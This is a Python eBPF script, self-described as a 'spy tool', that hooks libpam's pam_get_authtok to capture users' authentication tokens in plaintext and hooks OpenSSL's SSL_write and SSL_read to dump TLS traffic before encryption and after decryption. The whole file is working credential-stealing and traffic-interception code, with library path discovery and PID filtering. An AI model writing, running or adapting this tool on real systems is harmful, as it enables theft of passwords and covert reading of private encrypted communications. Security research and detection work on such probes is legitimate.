#!/usr/bin/python3
from bcc import BPF
import ctypes.util
import os
import argparse
import sys

# -----------------------------------------------------------------------------
# BPF C PROGRAM
# -----------------------------------------------------------------------------
bpf_source = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

// Struct to define the key for our maps (Thread ID)
struct key_t {
    u32 pid;
};

// ============================================================================
// PAM MAPS
// ============================================================================
// Key: PID, Value: Address of 'authtok' pointer
BPF_HASH(pam_params_map, struct key_t, char **);

// ============================================================================
// SSL MAPS
// ============================================================================
// Key: PID, Value: Address of buffer for SSL_read
BPF_HASH(ssl_read_map, struct key_t, char *);

// ============================================================================
// PAM HOOKS
// ============================================================================
int trace_pam_entry(struct pt_regs *ctx) {
    struct key_t key = {};
    char **authtok_ptr_addr;

    key.pid = bpf_get_current_pid_tgid();
    authtok_ptr_addr = (char **)PT_REGS_PARM3(ctx);
    pam_params_map.update(&key, &authtok_ptr_addr);
    return 0;
}

int trace_pam_return(struct pt_regs *ctx) {
    struct key_t key = {};
    char ***authtok_pp;
    char **authtok_p;
    char *authtok_val;
    char captured_str[80] = {};

    key.pid = bpf_get_current_pid_tgid();
    authtok_pp = pam_params_map.lookup(&key);
    if (authtok_pp == 0) return 0;

    authtok_p = *authtok_pp;
    if (bpf_probe_read_user(&authtok_val, sizeof(authtok_val), authtok_p) < 0) {
        pam_params_map.delete(&key);
        return 0;
    }

    if (bpf_probe_read_user_str(captured_str, sizeof(captured_str), authtok_val) < 0) {
        pam_params_map.delete(&key);
        return 0;
    }

    bpf_trace_printk("PAM Spy: PID %d returned authtok='%s'\\n", key.pid, captured_str);
    pam_params_map.delete(&key);
    return 0;
}

// ============================================================================
// SSL HOOKS
// ============================================================================
// SSL_write(SSL *ssl, const void *buf, int num)
// Triggered BEFORE encryption. We just read the buffer directly.
int trace_ssl_write(struct pt_regs *ctx) {
    char *buf_addr;
    char captured_data[80] = {};
    u32 pid = bpf_get_current_pid_tgid();

    // 2nd arg is buffer
    buf_addr = (char *)PT_REGS_PARM2(ctx);

    if (bpf_probe_read_user(captured_data, sizeof(captured_data), buf_addr) < 0) {
        return 0;
    }

    bpf_trace_printk("SSL WRITE (PID %d): %s\\n", pid, captured_data);
    return 0;
}

// SSL_read(SSL *ssl, void *buf, int num)
// Entry: Save where the buffer is.
int trace_ssl_read_entry(struct pt_regs *ctx) {
    struct key_t key = {};
    char *buf_addr;

    key.pid = bpf_get_current_pid_tgid();
    // 2nd arg is buffer (where data will be written to)
    buf_addr = (char *)PT_REGS_PARM2(ctx);

    ssl_read_map.update(&key, &buf_addr);
    return 0;
}

// Return: Data is now in the buffer. Read it.
int trace_ssl_read_return(struct pt_regs *ctx) {
    struct key_t key = {};
    char **buf_addr_p;
    char *buf_addr;
    char captured_data[80] = {};

    key.pid = bpf_get_current_pid_tgid();
    buf_addr_p = ssl_read_map.lookup(&key);
    if (buf_addr_p == 0) return 0;

    buf_addr = *buf_addr_p;

    // Read the data that was just decrypted into the buffer
    if (bpf_probe_read_user(captured_data, sizeof(captured_data), buf_addr) < 0) {
        ssl_read_map.delete(&key);
        return 0;
    }

    bpf_trace_printk("SSL READ (PID %d): %s\\n", key.pid, captured_data);
    ssl_read_map.delete(&key);
    return 0;
}
"""

# -----------------------------------------------------------------------------
# HELPERS
# -----------------------------------------------------------------------------
def find_library(lib_name, common_paths):
    """Helper to find library path."""
    path = ctypes.util.find_library(lib_name)
    if path and os.path.isabs(path) and os.path.exists(path):
        return path
    
    for p in common_paths:
        if os.path.exists(p):
            return p
    return None

def find_libpam():
    return find_library("pam", [
        "/lib/x86_64-linux-gnu/libpam.so.0",
        "/usr/lib/x86_64-linux-gnu/libpam.so.0",
        "/lib64/libpam.so.0",
        "/usr/lib64/libpam.so.0",
        "/usr/lib/libpam.so.0",
        "/lib/libpam.so.0",
    ])

def find_libssl():
    return find_library("ssl", [
        "/usr/lib/x86_64-linux-gnu/libssl.so.3",
        "/usr/lib/x86_64-linux-gnu/libssl.so.1.1",
        "/lib64/libssl.so.3",
        "/lib64/libssl.so.1.1",
        "/usr/lib64/libssl.so.3",
        "/usr/lib64/libssl.so.1.1",
        "/lib/libssl.so.3",
    ])

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="eBPF Spy Tool - Intercept PAM and SSL/TLS")
    parser.add_argument("--mode", choices=["pam", "ssl", "all"], default="all", help="Which probes to attach (default: all)")
    parser.add_argument("--libpam", help="Path to libpam.so (manual override)", default=None)
    parser.add_argument("--libssl", help="Path to libssl.so (manual override)", default=None)
    parser.add_argument("--pid", help="Filter output by PID (optional)", type=int, default=0)
    args = parser.parse_args()

    print("[*] Compiling BPF program...")
    b = BPF(text=bpf_source)

    # -------------------------------------------------------
    # ATT: PAM
    # -------------------------------------------------------
    if args.mode in ["pam", "all"]:
        path = args.libpam or find_libpam()
        if not path:
            print("[!] Could not find libpam.so. skip or specify --libpam")
            if args.mode == "pam": sys.exit(1)
        else:
            print(f"[*] Attaching PAM probes to {path}...")
            try:
                b.attach_uprobe(name=path, sym="pam_get_authtok", fn_name="trace_pam_entry")
                b.attach_uretprobe(name=path, sym="pam_get_authtok", fn_name="trace_pam_return")
                print("    -> PAM probes attached.")
            except Exception as e:
                print(f"    [!] Failed to attach PAM probes: {e}")

    # -------------------------------------------------------
    # ATT: SSL
    # -------------------------------------------------------
    if args.mode in ["ssl", "all"]:
        path = args.libssl or find_libssl()
        if not path:
            print("[!] Could not find libssl.so. skip or specify --libssl")
            if args.mode == "ssl": sys.exit(1)
        else:
            print(f"[*] Attaching SSL probes to {path}...")
            try:
                # SSL_write (Entry)
                b.attach_uprobe(name=path, sym="SSL_write", fn_name="trace_ssl_write")
                # SSL_read (Entry/Return)
                b.attach_uprobe(name=path, sym="SSL_read", fn_name="trace_ssl_read_entry")
                b.attach_uretprobe(name=path, sym="SSL_read", fn_name="trace_ssl_read_return")
                print("    -> SSL probes attached.")
            except Exception as e:
                print(f"    [!] Failed to attach SSL probes: {e}")

    print("-" * 60)
    print(f"[*] Listening... (Mode: {args.mode})")
    print("[*] Trace output:")
    
    try:
        while True:
            line = b.trace_readline()
            if not line: continue
            try:
                decoded = line.decode().strip()
                if args.pid and f"PID {args.pid}" not in decoded:
                    continue
                print(decoded)
            except UnicodeDecodeError:
                print(line)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")

if __name__ == "__main__":
    main()
